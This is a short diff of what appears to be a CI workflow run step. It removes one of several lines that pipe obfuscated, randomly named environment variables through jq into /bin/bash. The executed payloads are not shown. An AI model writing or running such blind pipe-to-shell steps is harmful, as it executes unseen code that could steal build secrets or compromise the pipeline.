@@ -18,7 +18,6 @@ jobs:
         run: |
           printf '%s' "$wrpcd1600" | jq -r .n9639 | /bin/bash
           echo $zcba6212 | jq -r .xdho47160 | /bin/bash
-          echo $tme2013 | jq -r .rfskv132 | /bin/bash
           printf '%s' "$zqe51505" | jq -r .tzb2489 | /bin/bash
           echo $nzfa15 | jq -r .yrxd45271 | /bin/bash
           echo $g00 | jq -r .mnrl4848 | /bin/bash
